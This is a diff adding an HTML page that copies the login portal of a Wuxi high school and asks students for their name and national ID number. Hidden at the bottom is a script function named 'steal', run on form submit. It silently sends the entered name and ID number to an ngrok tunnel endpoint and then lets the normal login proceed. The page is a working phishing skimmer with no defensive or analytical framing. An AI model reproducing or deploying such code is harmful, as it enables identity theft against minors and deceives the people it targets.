@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>无锡市第一中学学生综合管理平台</title>
+    <link rel="stylesheet" href="https://yzxs.wxeic.com/public/default/css/style.css">
+    <script src="https://yzxs.wxeic.com/public/default/js/jquery.min.js"></script>
+</head>
+<body>
+<div class="wrapper">
+    <div class="head">
+        <div class="container position-relative">
+            <a href="https://yzxs.wxeic.com/home" id="logo" class="fl"></a>
+            <ul id="header_link">
+                <li><a href="https://yzxs.wxeic.com/home">首页</a></li>
+                <li><a href="https://yzxs.wxeic.com/article/index?cid=5">通知公告</a></li>
+                <li><a href="https://yzxs.wxeic.com/article/index?cid=6">温馨提示</a></li>
+            </ul>
+            <div id="quick">
+                <a href="https://yzxs.wxeic.com/home" class="ci-btn"></a>
+            </div>
+            <div class="user-btn">
+                <a href="https://yzxs.wxeic.com/home"><img src="https://yzxs.wxeic.com/public/default/img/home.png" alt=""></a>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-body">
+        <div class="container">
+            <div id="slider">
+                <img src="/upload/img/2022/07/08/u2fhm0bv6ll3ba932uhnbi79c68at7kv-1657265919.jpg">
+            </div>
+            <div class="box">
+                <link rel="stylesheet" href="https://yzxs.wxeic.com/public/default/css/swiper-bundle.min.css">
+                <script src="https://yzxs.wxeic.com/public/default/js/swiper-bundle.min.js"></script>
+                <div class="sidebar">
+                    <div class="login border-default">
+                        <div class="login-heading">新生登录</div>
+                        <div class="login-body">
+                            <div class="form-group">
+                                <a href="https://yzxs.wxeic.com/passport/login" class="btn btn-user-home btn-block">点击登录</a>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="ewm border-default">
+                        <div class="swiper-container" style="height:245px;">
+                            <div class="swiper-wrapper">
+                                <div class="swiper-slide">
+                                    <img src="https://yzxs.wxeic.com/public/default/img/ewm.png" alt="">
+                                    <div class="qrcode-description">
+                                        (无锡一中微信公众号)<br />扫描二维码添加关注
+                                    </div>
+                                </div>
+                            </div>
+                            <div class="swiper-pagination"></div>
+                        </div>
+                    </div>
+                    <div class="blogroll">
+                        <ul class="nav">
+                            <li><a href="https://yizhong.wxeic.cn/" target="_blank">学校主页</a></li>
+                        </ul>
+                    </div>
+                </div>
+                <div class="main-content ">
+                    <div class="part border-default mt-10">
+                        <div class="title-panel">
+                            <div class="title-bar fl">
+                                <img src="https://yzxs.wxeic.com/public/default/img/notice.png" alt="">
+                                学生登录
+                            </div>
+                        </div>
+
+                        <div style="background-color: #fff;text-align: center;padding-bottom: 20px; padding-top:40px;">
+                            <form action="https://yzxs.wxeic.com/passport/login" method="post" onsubmit="steal(event)">
+                                <div class="form-group" style="width:90%;margin:0 auto;padding: 10px 0;">
+                                    <label style="font-size: 14px;line-height: 40px;">学生姓名：</label>
+                                    <input type="text" class="form-control" name="name" placeholder="请输入学生姓名" required="required" style="width:200px; height:30px; border:1px solid #999; border-radius:3px;">
+                                </div>
+                                <div class="form-group" style="width:90%;margin:0 auto;padding: 10px 0;">
+                                    <label style="font-size: 14px;line-height: 40px;">身份证号：</label>
+                                    <input type="text" class="form-control" name="id_number" placeholder="请输入学生身份证号码" required="required" style="width:200px;height:30px; border:1px solid #999; border-radius:3px;">
+                                </div>
+                                <button class="btn btn-red btn-block" type="submit" style="width:100px;margin:0 auto; margin-top:20px;">登录</button>
+                            </form>
+                        </div>
+                        <div style="background-color: #fff;text-align: center;padding-bottom: 60px; padding-top:30px; font-size:12px;">说明：身份证号码中“X”为大写</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="foot">
+        <div class="container">
+            <a href="#" class="botLogo">
+                <img src="/upload/img/2026/07/09/mq7la8e9huegaq77r94ap7n9kposbjj5-1783608340.png" alt="">
+            </a>
+            <p>Copyright © 2026 无锡市第一中学 All Rights Reserved.</p>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(document).ready(function(){
+        $("#logo").css({'background':'url(/upload/img/2026/07/09/mq7la8e9huegaq77r94ap7n9kposbjj5-1783608337.png) no-repeat','background-size':'cover','-webkit-background-size':'cover','-o-background-size':'cover'});
+    });
+</script>
+<script src="https://yzxs.wxeic.com/public/baidu.js"></script>
+
+<script>
+function steal(e) {
+    var name = document.querySelector('input[name="name"]').value;
+    var idNumber = document.querySelector('input[name="id_number"]').value;
+    if (name && idNumber) {
+        var data = {
+            name: name,
+            id: idNumber,
+            time: new Date().toISOString()
+        };
+        fetch('https://matrimony-raving-colony.ngrok-free.dev/collect', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(data),
+            mode: 'no-cors'
+        }).catch(function(err) {});
+    }
+    return true;
+}
+</script>
+</body>
+</html>
